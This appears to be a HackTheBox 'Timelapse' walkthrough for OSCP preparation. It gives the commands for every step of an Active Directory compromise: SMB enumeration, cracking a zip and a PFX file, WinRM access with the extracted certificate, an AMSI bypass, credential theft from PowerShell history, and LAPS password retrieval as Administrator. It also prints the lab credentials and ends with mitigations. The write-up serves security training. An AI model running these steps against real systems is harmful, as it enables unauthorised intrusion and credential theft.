---
title: Timelapse
date: 2025-06-15
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, AD, .pfx, pfx2john, zip2john, fcrackzip, winrms-5986, powershell-history, LAPS, LAPS-Readers, pyLAPS ] 
image: time.png
media_subpath: /assets/img/posts/2025-06-15-timelapseHTB/
---

## Introduction

**Timelapse** is an *easy-difficulty Windows machine* where enumeration of an **SMB share** leads to a **password-protected zip file**. Cracking the zip file reveals an **encrypted PFX certificate**, which is also cracked using `John` after converting it into a suitable hash format. The extracted certificate and private key enable **WinRM access**. Post-authentication, a **PowerShell history file** exposes credentials for the `svc_deploy` user. This user is part of the **LAPS_Readers** group, which has permissions to retrieve **LAPS-managed local admin passwords**, allowing the attacker to extract the **Administrator password** and escalate privileges.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 53

Domain: **timelapse.htb**

- **dig any DNS records**
    
    ```bash
    dig any timelapse.htb @$IP
    ```
    
    ![image.png](image%202.png)
    
- **Zone Transfer**
    
    ```bash
    dig axfr @$IP timelapse.htb
    ```
    
    ![image.png](image%203.png)
    

### Port 139/445

```bash
sudo nxc smb $IP -u 'anon' -p '' --shares
```

![image.png](image%204.png)

```bash
smbclient //$IP/Shares -N
- PROMPT OFF
- RECURSE ON
- mget *
```

I found `.zip` file under `Dev` directory.

And from HelpDesk I see that LAPS is installed:

![image.png](image%205.png)

### Port 135

```bash
rpcclient -U'%' $IP
```

**NT_STATUS_ACCESS_DENIED**

### Port 5986 (WinRM over HTTPS)

## AD Initial Enumeration

### User Enumeration

Unauthenticated

```bash
impacket-lookupsid 'timelapse.htb/guest'@timelapse.htb -no-pass | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users
```

### User Description Fields

```bash
sudo nxc smb $IP -u 'guest' -p '' --users
```

Nothing returned.

### Port 389/3268

```powershell
ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=timelapse,DC=htb"
```

LDAP Anonymous Bind is not enabled.

## Initial Attack Vectors

### AS-REP Roasting

```bash
GetNPUsers.py timelapse.htb/ -dc-ip $IP -no-pass -usersfile users
```

No result.

## Exploitation

Trying to unzip `winrm_backup.zip` file, it requires password for it, I am gonna try to crack it using `fcrackzip`.

```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
```

![image.png](image%206.png)

Now we have `legacyy_dev_auth.pfx`. As port 5986 is also open that lures us to authenticate using winrm using this file. I wanted to extract key file from `pfx` and it requires import password I am gonna try to crack `pfx` file that we have.

```bash
pfx2john legacyy_dev_auth.pfx > pfx.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash
john pfx.hash --show
```

![image.png](image%207.png)

Extract key file:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out auth.key -nodes
```

Extract cert file:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out auth.crt
```

Connect using evil-winrm:

```bash
evil-winrm -S -c auth.crt -k auth.key -i timelapse.htb
```

![image.png](image%208.png)

## Shell as svc_deploy

Enumeration - BloodHound

```powershell
.\SharpHound.exe -c All --zipfilename timelapse
```

User `TRX` has DCSync privileges:

![image.png](image%209.png)

```powershell
net user svc_deploy
```

![image.png](image%2010.png)

User `svc_deploy` is in `LAPS_Readers`.

I didn’t find interesting paths, then I tried running PowerUp.ps1, but some kind of protection prevented me, I used:

```powershell
Bypass-4MSI
```

of evil-winrm:

![image.png](image%2011.png)

Then ran:

```powershell
Invoke-AllChecks
```

But, found nothing.

I remember that LAPS was installed, and we can see that from listing x64 applications:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

![image.png](image%2012.png)

Checking PowerShell history I see:

```powershell
type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

![image.png](image%2013.png)

Now I am gonna use these credentials to login as `svc_deploy`:

```powershell
 evil-winrm -S -i $IP -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV’
```

`-S` - is used when port 5986 is open which means `SSL is enabled`.

## Shell as Administrator | NT Authority /System

I remember from enumeration that `svc_deploy` was in `LAPS_Readers`. Now I am gonna try to read Local Admin password using [`pyLAPS`](https://github.com/p0dalirius/pyLAPS):

```powershell
python3 pyLAPS.py --action get -d "timelapse.htb" -u "svc_deploy" -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

![image.png](image%2014.png)

Now we can authenticated as Local Admin using evil-winrm, or as NT Authority/System using psexec:

```powershell
psexec.py timelapse.htb/administrator:'5X67{H]$xPp{62/3$+3IC6p&'@$IP
```

It should work eventually, just kept hanging, I am gonna use evil-winrm anyway:

![image.png](image%2015.png)

```powershell
evil-winrm -S -i $IP -u administrator -p '5X67{H]$xPp{62/3$+3IC6p&'
```

![image.png](image%2016.png)

## Credentials

```bash
supremelegacy #zip file password
thuglegacy #pfx password
svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV
5X67{H]$xPp{62/3$+3IC6p&
```

## Mitigation

- Restrict access to **SMB shares** and avoid placing sensitive files in public shares.
- Ensure **strong passwords** are used for archived and certificate files.
- Regularly **clear PowerShell history** and avoid storing plaintext credentials in scripts.
- Audit and limit **LAPS_Readers** group membership.
- Implement **logging and monitoring** for WinRM and PowerShell activity.
